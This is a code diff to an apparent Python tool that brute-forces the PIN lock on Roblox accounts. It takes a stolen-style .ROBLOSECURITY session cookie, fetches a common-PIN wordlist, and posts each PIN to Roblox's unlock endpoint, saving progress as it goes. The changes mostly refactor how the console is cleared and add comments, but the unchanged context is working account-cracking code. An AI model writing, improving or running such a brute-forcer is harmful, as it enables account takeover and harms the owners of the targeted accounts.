@@ -27,6 +27,12 @@ def getXsrf(cookie):
         '.ROBLOSECURITY': cookie
     })
     return xsrfRequest.headers["x-csrf-token"]
+# --({ Clear Console }) -- #
+def clear():
+  if os.name == 'nt':
+    os.system("cls")
+  else:
+    os.system("clear")
 # --({ Diagnose Errors }) -- #
 def diagnose(error):
     global headers
@@ -113,10 +119,7 @@ class crack:
       print("] ", end="")
       cprint("Invalid Cookie", "red")
       time.sleep(1)
-      if os.name == 'nt':
-          os.system("cls")
-      else:
-          os.system("clear")
+      clear()
       crack.check()
   # --({ Start Cracker }) -- #
   def start(_):
@@ -135,10 +138,7 @@ class crack:
       print("] ", end="")
       cprint("Missing progress.json", "red")
       time.sleep(1)
-      if os.name == 'nt':
-          os.system("cls")
-      else:
-          os.system("clear")
+      clear()
       crack.check()
     for char in 'Cracking the pin....':
       time.sleep(0.1)
@@ -156,10 +156,8 @@ class crack:
       headers = {
       'X-CSRF-TOKEN': getXsrf(cookie),
       }
-      if os.name == 'nt':
-        os.system("cls")
-      else:
-        os.system("clear")
+      clear()
+      # --({ Start from progress saved }) -- #
       if continueProgress:
         try:
           startingLine = json.load(open("progress.json", "r"))[str(userid)]
@@ -169,15 +167,13 @@ class crack:
           print("] " , end="")
           cprint(f"There is no progress saved inside for this account progress.json", 'red')
           time.sleep(2)
-          if os.name == 'nt':
-            os.system("cls")
-          else:
-            os.system("clear")
+          clear()
           crack.check()
         pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
       else:
         startingLine = 0
         pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
+      # --({ Update progress }) -- #
       for line, pin in enumerate(pins):
         print("[", end="")
         cprint(" BRUTEFORCER ", "magenta", end="")
@@ -188,6 +184,7 @@ class crack:
           progress[str(userid)] = int(line+startingLine)
           json.dump(progress, f, indent=1)
         response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
+        # --({ Check if the pin was found }) -- #
         try:
           if "unlockedUntil" in str(response):
             cprint("Cookie:", 'blue')
@@ -220,6 +217,7 @@ class crack:
             print("] " , end="")
             cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
             time.sleep(5)
+            clear()
             crack.start()
             break
           elif response['errors'][0]['message'] == 'Token Validation Failed':
@@ -235,10 +233,7 @@ class crack:
         cprint(" ERROR ", "red", end="")
         print("] " , end="")
         cprint("Invalid Cookie", 'red')
-        if os.name == 'nt':
-            os.system("cls")
-        else:
-            os.system("clear")
+        
         
 
 # --({ Start program }) -- #
